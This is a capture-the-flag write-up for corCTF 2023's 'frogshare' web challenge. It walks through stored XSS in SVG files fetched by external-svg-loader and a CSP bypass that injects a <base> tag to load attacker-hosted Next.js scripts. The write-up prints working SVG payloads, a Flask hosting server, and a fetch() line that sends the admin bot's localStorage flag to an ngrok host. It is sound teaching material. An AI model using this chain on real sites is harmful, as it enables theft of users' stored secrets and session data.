# frogshare

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Contributor: @flocto, @Elmou (abdelmoumen)
- Solved by: @siunam
- 33 solves / 193 points
- Author: jazzpizazz
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

Welcome to Frogshare, the hoppiest place to share your beloved amphibians with fellow frog fanatics! But hold on to your lily pads, our admin reviews your content before its published...

[frogshare.be.ax](https://frogshare.be.ax)

Please inform our admin once you shared a frog: [Admin Bot](https://adminbot.be.ax/web-frogshare)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144003.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144133.png)

In the index page (`/`), we can register a new account or login.

Let's register an account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144214.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144224.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144236.png)

**After logged in, we can see some shared frogs by the admin, and able to share a frog in the bottom-right corner's button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144342.png)

Let's create a frog!

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144449.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144459.png)

**After created a frog, we can update it's detail via bottom-right corner's button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144602.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144613.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144621.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731144643.png)

When we submit the new frog's detail, it'll send a **PATCH request to `/api/frog?id=<id>`, with the frog's detail in JSON format.**

**Also, we can send an URL to the admin bot:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731150010.png)

So, it's a client-side challenge, we'll have to send an URL to the admin bot, which contains some client-side payloads (i.e: Reflected XSS).

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/web/frogshare/frogshare.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/frogshare)-[2023.07.31|14:41:03(HKT)]
└> file frogshare.tar.gz   
frogshare.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 419840
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/frogshare)-[2023.07.31|14:41:05(HKT)]
└> tar xf frogshare.tar.gz   
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/frogshare)-[2023.07.31|14:41:09(HKT)]
└> ls -lah frogshare 
total 244K
drwxr-xr-x 8 siunam nam 4.0K Jul 26 04:00 .
drwxr-xr-x 3 siunam nam 4.0K Jul 31 14:41 ..
-rw-r--r-- 1 siunam nam 1019 Jul 26 04:00 adminbot.js
drwxr-xr-x 2 siunam nam 4.0K Jul 26 04:00 components
-rw-r--r-- 1 siunam nam  36K Jul 26 04:00 db.sqlite
-rw-r--r-- 1 siunam nam 1.4K Jul 26 04:00 Dockerfile
drwxr-xr-x 2 siunam nam 4.0K Jul 26 04:00 hooks
-rw-r--r-- 1 siunam nam   93 Jul 26 04:00 jsconfig.json
-rw-r--r-- 1 siunam nam  149 Jul 26 04:00 next.config.js
-rw-r--r-- 1 siunam nam  821 Jul 26 04:00 package.json
-rw-r--r-- 1 siunam nam 143K Jul 26 04:00 package-lock.json
drwxr-xr-x 4 siunam nam 4.0K Jul 26 04:00 pages
-rw-r--r-- 1 siunam nam   82 Jul 26 04:00 postcss.config.js
drwxr-xr-x 3 siunam nam 4.0K Jul 26 04:00 public
-rw-r--r-- 1 siunam nam   77 Jul 26 04:00 secrets.js
drwxr-xr-x 2 siunam nam 4.0K Jul 26 04:00 styles
-rw-r--r-- 1 siunam nam  242 Jul 26 04:00 tailwind.config.js
drwxr-xr-x 2 siunam nam 4.0K Jul 26 04:00 utils
```

After poking around, I found that the web application is using Node.js's [axios](https://axios-http.com/docs/intro) library, which is written React JS.

**Then, in `components/Frog.js`, we can see how our shared frog is being rendered:**
```js
import { useMemo, memo } from "react";
import "external-svg-loader";
import { Tooltip } from "react-tooltip";
import useIsMounted from "@/hooks/useIsMounted";

const Frog = memo(({ frog }) => {
    const { isMounted } = useIsMounted();

    const { name, img, creator } = frog;

    const svgProps = useMemo(() => {
        try {
            return JSON.parse(frog.svgProps);
        } catch {
            return null;
        }
    }, [frog.svgProps]);

    if (!isMounted) return null;
    return (
        <>
            <div
                className="flex flex-col bg-white p-8 rounded-xl shadow-md text-center h-[169px] w-[169px] mr-4 mb-4 relative"
                data-tooltip-id="frog-tooltip"
                data-tooltip-content={`By ${creator}`}
            >
                <div className="flex justify-center w-full h-[64px]">
                    <svg data-src={img} {...svgProps} />
                </div>
                <div className="text-lg">{name}</div>
            </div>
            <Tooltip id="frog-tooltip" />
        </>
    );
});

Frog.displayName = "Frog";

export default Frog;
```

As you can see, it's using a library called "[external-svg-loader](https://www.npmjs.com/package/external-svg-loader)", which is a SVG Loader. When SVGs from an external source, they can be rendered with `<img>` tags.

Hmm... I can smell some **stored/persistence XSS (Cross-Site Scripting) via SVG**!

## Exploitation

**According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-svg), we can use the following payloads:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731152053.png)

**Let's use the first one:**
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

To host the SVG payload, we can use Python's `http.server` module and `ngrok` to do port forwarding:

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/frogshare)-[2023.07.31|15:22:41(HKT)]
└> cat payload.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/frogshare)-[2023.07.31|15:22:44(HKT)]
└> python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2023/web/frogshare)-[2023.07.31|15:23:04(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://2eb1-[...].ngrok-free.app -> http://localhost:80            
[...]
```

**Then, update our frog's "SVG url":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731152457.png)

**Go back to our shared frog:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731152558.png)

Wait... Our SVG URL is blocked by CORS (Cross-Origin Resource Sharing) due to SOP (Same Origin Policy)?

**According to [external-svg-loader documentation](https://www.npmjs.com/package/external-svg-loader), it said:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731152814.png)

Ahh, external-svg-loader uses XHR (`XMLHttpRequest`) to fetch files.

**To solve this issue, we can host the SVG file via Flask with `flask_cors` instead of module `http.server`:**
```python
#!/usr/bin/env python3
from flask import Flask, send_file
from flask_cors import CORS

app = Flask(__name__)

# Access-Control-Allow-Origin: *
CORS(app)

@app.route('/payload')
def serveSvgPayload():
    svgPayloadFile = 'payload.svg'
    return send_file(svgPayloadFile)

if __name__ == '__main__':
    app.run(port=80, debug=True)
```

**Now, update the SVG URL and refresh the shared frog page again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731154021.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731154039.png)

**Flask web application:**
```shell
127.0.0.1 - - [31/Jul/2023 15:39:07] "GET /payload HTTP/1.1" 200 -
```

It indeed fetched, **but where's the `<script>` tag??**

**According to [external-svg-loader documentation](https://www.npmjs.com/package/external-svg-loader#user-content-2-enable-javascript), it said:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731154304.png)

Ahh... It'll strip all `<script>` tags and inline scripts (i.e: `onerror`)...

**After some trial and error, I found that the second payload in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-svg-short) is interesting:**
```svg
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
```

What's that `<foreignObject>` element??

> The **`<foreignObject>`** [SVG](https://developer.mozilla.org/en-US/docs/Web/SVG) element includes elements from a different XML namespace. In the context of a browser, it is most likely (X)HTML. (From [https://developer.mozilla.org/en-US/docs/Web/SVG/Element/foreignObject](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/foreignObject))

**In the [MDN Web Docs's example](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/foreignObject#example), we can see that `<foreignObject>` element can include other HTML elements!**
```html
<svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
  <foreignObject x="20" y="20" width="160" height="160">
    <div xmlns="http://www.w3.org/1999/xhtml">
      Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed mollis mollis
      mi ut ultricies. Nullam magna ipsum, porta vel dui convallis, rutrum
      imperdiet eros. Aliquam erat volutpat.
    </div>
  </foreignObject>
</svg>
```

**Hmm... We can try to use `<foreignObject>` element to inject our evil `<script>` tag!**

**After fumbling around, I found [this writeup](https://insert-script.blogspot.com/2020/09/xss-challenge-solution-svg-use.html), which uses `<iframe>` tag inside the `<foreignObject>` element to achieve stored XSS via SVG:**
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

  <foreignObject>
    <iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
  </foreignObject>
</svg>
```

**Then update the shared frog's SVG URL again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731155248.png)

> Note: By default, external-svg-loader will cache the fetched files for 30 days. To refresh the cache, we can provide any GET parameter.

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731160052.png)

Ah crab! I forgot there's a **CSP (Content Security Policy)** in this web application!!

> Note: CSP is making XSS attacks **harder**, but it's not fixing the underlying XSS vulnerability itself.

So, we need to **bypass the CSP** in order to execute our evil JavaScript...

**In `pages/_document.js`, we can see that the web application is using [next-strict-csp](https://www.npmjs.com/package/next-strict-csp) library to implement the CSP:** 
```js
import Document, { Html, Head, Main, NextScript } from "next/document";
import { NextStrictCSP } from "next-strict-csp";

const HeadCSP = process.env.NODE_ENV === "production" ? NextStrictCSP : Head;

class CustomDocument extends Document {
    render() {

        return (
            <Html>
                <HeadCSP>
                    {process.env.NODE_ENV === "production" && (
                        <meta httpEquiv="Content-Security-Policy" />
                    )}
                </HeadCSP>
                <body>
                    <Main />
                    <NextScript />
                </body>
            </Html>
        );
    }
}
export default CustomDocument;
```

**CSP:**
```
script-src 'strict-dynamic' 'sha256-XBHlwr81NgICWcOBenKzOWkqQvdzG1RnPBRsqqA2U/U='  'unsafe-inline' http: https:;
```

**Directives:** (From [HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass))
- `script-src`: This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into elements, but also things like inline script event handlers (`onclick`) and XSLT stylesheets which can trigger script execution.

**Sources:**
- `strict-dynamic`: It allows the browser to load and execute new JavaScript tags in the DOM from any script source that has previously been whitelisted by a "nonce" or "hash" value.
- `unsafe-inline`: This allows the use of inline resources, such as inline elements, javascript: URLs, inline event handlers, and inline elements. Again this is not recommended for security reasons.
- `http:`, `https:`: Allows execute JavaScript from `http`, `https` schema.

However, when `strict-dynamic` is using, `unsafe-inline`, `http:` and `https:` will be ignored.

**We can also copy the CSP and paste it to Google's [CSP Evaluator](https://csp-evaluator.withgoogle.com/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731161258.png)

Hmm... There are 2 high severity finding:

1. Missing `object-src` directive
2. Missing `base-uri` directive

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#missing-base-uri), we can bypass the CSP via `<base>` tag due to missing `base-uri` directive!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731161451.png)

**In Next.js (React framework), it'll import some JavaScript files using a relative path:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731161756.png)

Armed with above information, **we can inject a `<base>` tag via SVG, and let those JavaScript files imported from our web server!!**

**payload.svg:**
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

  <foreignObject>
    <base href="https://2eb1-[...].ngrok-free.app">
  </foreignObject>
</svg>
```

**Update the SVG URL again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731162207.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731162330.png)

**Flask web application:**
```shell
127.0.0.1 - - [31/Jul/2023 16:22:49] "GET /_next/static/chunks/pages/index-3228b8a1fcea6589.js HTTP/1.1" 404 -
```

Nice! It's trying to **import `/_next/static/chunks/pages/index-3228b8a1fcea6589.js` JavaScript file** from our web server!!

**Then, we can create a new route in Flask and JavaScript payload:**
```python
#!/usr/bin/env python3
from flask import Flask, send_file
from flask_cors import CORS

app = Flask(__name__)

# Access-Control-Allow-Origin: *
CORS(app)

@app.route('/payload')
def serveSvgPayload():
    svgPayloadFile = 'payload.svg'
    return send_file(svgPayloadFile)

@app.route('/_next/static/chunks/pages/index-3228b8a1fcea6589.js')
def abuseBaseSrc():
    javaScriptFile = 'payload.js'
    return send_file(javaScriptFile)

if __name__ == '__main__':
    app.run(port=80, debug=True)
```

**payload.js:**
```js
alert(`Payload executed:\nDomain: ${document.domain}`);
```

**Refresh the shared frog page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731162732.png)

**Flask web application:**
```shell
127.0.0.1 - - [31/Jul/2023 16:27:01] "GET /_next/static/chunks/pages/index-3228b8a1fcea6589.js HTTP/1.1" 200 -
```

Let's go!! We now can execute arbitrary JavaScript code!

**In `adminbot.js`, we can see where's the flag is being stored:**
```js
import secrets from './secrets';

const username = "admin";
const { flag, password } = secrets;

export default {
    id: 'frogshare',
    name: 'frogshare',
    timeout: 20000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto("https://frogshare.be.ax/login", { waitUntil: 'load' });

        await page.evaluate((flag) => {
            localStorage.setItem("flag", flag);
        }, flag);

        await page.type("input[name=username]", username);
        await page.type("input[name=password]", password);
        await Promise.all([
            page.waitForNavigation(),
            page.click("input[type=submit]")
        ]);
        /* No idea why the f this is required :| */
        await page.goto("https://frogshare.be.ax/frogs?wtf=nextjs", { timeout: 5000, waitUntil: 'networkidle0' });
        await page.waitForTimeout(2000);
        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle0' });
        await page.waitForTimeout(5000);
    },
}
```

As you can see, **the flag is being stored at `localStorage`, with key `flag`.**

**Time to exfiltrate the flag!**

**Modify the JavaScript payload:**
```js
fetch('https://2eb1-[...].ngrok-free.app/flag?c='+localStorage.getItem('flag'));
```

This will send a GET request to our Ngrok's port forwarding domain with GET parameter `c`, which includes the localStorage's `flag` key's value.

**For sanity check, refresh the shared frog page:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731163527.png)

```shell
127.0.0.1 - - [31/Jul/2023 16:34:43] "GET /_next/static/chunks/pages/index-3228b8a1fcea6589.js HTTP/1.1" 200 -
127.0.0.1 - - [31/Jul/2023 16:34:44] "GET /flag?c=null HTTP/1.1" 404 -
```

**Nice! It worked, let's send the shared frog URL to the admin bot!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731163603.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731163617.png)

```shell
127.0.0.1 - - [31/Jul/2023 16:36:22] "GET /payload?cachebuster=69 HTTP/1.1" 200 -
```

Uhh... There's no `/flag` GET request... What??

After fumbling around, the shared frog page must need to ***refresh*** in order to trigger the JavaScript execution...

**To solve that problem, we can use the `<meta>` tag.**

**Let's modify our SVG payload again:**
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

  <foreignObject>
    <base href="https://2eb1-[...].ngrok-free.app">
    <meta http-equiv="refresh" content="2;url=https://frogshare.be.ax/frogs/59">
  </foreignObject>
</svg>
```

The `<meta>` tag will redirect the user to `https://frogshare.be.ax/frogs/<your_frog_id>` after 2 seconds.

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2023/images/Pasted%20image%2020230731164001.png)

**Then send the shared frog page to admin bot again:**
```shell
127.0.0.1 - - [31/Jul/2023 16:40:41] "GET /payload?cachebuster=420 HTTP/1.1" 200 -
127.0.0.1 - - [31/Jul/2023 16:40:44] "GET /_next/static/chunks/pages/index-3228b8a1fcea6589.js HTTP/1.1" 200 -
127.0.0.1 - - [31/Jul/2023 16:40:45] "GET /flag?c=corctf{M1nd_Th3_Pr0p_spR34d1ng_XSS_ThR34t} HTTP/1.1" 404 -
127.0.0.1 - - [31/Jul/2023 16:40:46] "GET /_next/static/chunks/pages/index-3228b8a1fcea6589.js HTTP/1.1" 304 -
127.0.0.1 - - [31/Jul/2023 16:40:47] "GET /flag?c=corctf{M1nd_Th3_Pr0p_spR34d1ng_XSS_ThR34t} HTTP/1.1" 404 -
```

Nice!! It finally worked!

> Note: It refreshed twice because of the 5 seconds window in `adminbot.js` (`await page.waitForTimeout(5000);`).

- **Flag: `corctf{M1nd_Th3_Pr0p_spR34d1ng_XSS_ThR34t}`**

## Conclusion

What we've learned:

1. Stored XSS (Cross-Site Scripting) & CSP (Content Security Policy) Bypass